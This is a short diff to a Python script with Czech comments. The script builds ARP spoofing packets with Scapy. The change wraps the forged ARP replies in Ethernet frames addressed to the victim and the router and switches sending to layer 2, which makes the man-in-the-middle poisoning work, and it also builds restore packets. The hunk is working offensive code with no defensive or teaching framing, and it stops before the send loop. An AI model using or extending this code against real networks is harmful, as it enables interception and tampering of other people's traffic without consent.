@@ -1,16 +1,18 @@
-from scapy.all import ARP, wrpcap, send as s
+from scapy.all import ARP, wrpcap, sendp as s, Ether
 import time
 # --- Hlavní funkce --- #
 def spoof(target_ip, target_mac, router_ip, router_mac):
     # Odeslání ARP paketů
 
+
+
     # Vytvoření falešného ARP paketu pro oběť
-    arp_obet = ARP(op=2, psrc=router_ip, pdst=target_ip, hwdst=target_mac)
-    arp_router = ARP(op=2, psrc=target_ip, pdst=router_ip, hwdst=router_mac)
+    arp_obet = Ether(dst=target_mac) / ARP(op=2, psrc=router_ip, pdst=target_ip, hwdst=target_mac)
+    arp_router = Ether(dst=router_mac) / ARP(op=2, psrc=target_ip, pdst=router_ip, hwdst=router_mac)
 
     # Restore tabulek
-    arp_obet_restore = ARP(op=2, psrc=router_ip, hwsrc=router_mac, pdst=target_ip, hwdst=target_mac)
-    arp_router_restore = ARP(op=2, psrc=target_ip, hwsrc=target_mac, pdst=router_ip, hwdst=router_mac)
+    arp_obet_restore = Ether(dst=target_mac) / ARP(op=2, psrc=router_ip, hwsrc=router_mac, pdst=target_ip, hwdst=target_mac)
+    arp_router_restore = Ether(dst=router_mac) / ARP(op=2, psrc=target_ip, hwsrc=target_mac, pdst=router_ip, hwdst=router_mac)
 
     packet_list = []
 
